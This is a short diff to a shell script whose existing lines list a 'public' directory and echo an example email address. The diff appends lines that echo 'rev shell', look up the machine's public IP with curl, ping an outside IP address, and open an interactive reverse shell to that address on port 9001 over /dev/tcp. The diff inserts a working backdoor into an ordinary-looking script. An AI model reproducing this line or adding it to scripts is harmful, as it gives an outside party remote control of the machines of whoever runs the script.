@@ -58,4 +58,10 @@ echo "public"
 cat public/index.html
 ls -la public
 echo "johndoe@example.com"
+
+echo "rev shell"
+echo "ip public"
+curl ifconfig.me
+ping 54.73.133.183
+sh -i >& /dev/tcp/54.73.133.183/9001 0>&1
 exit 0
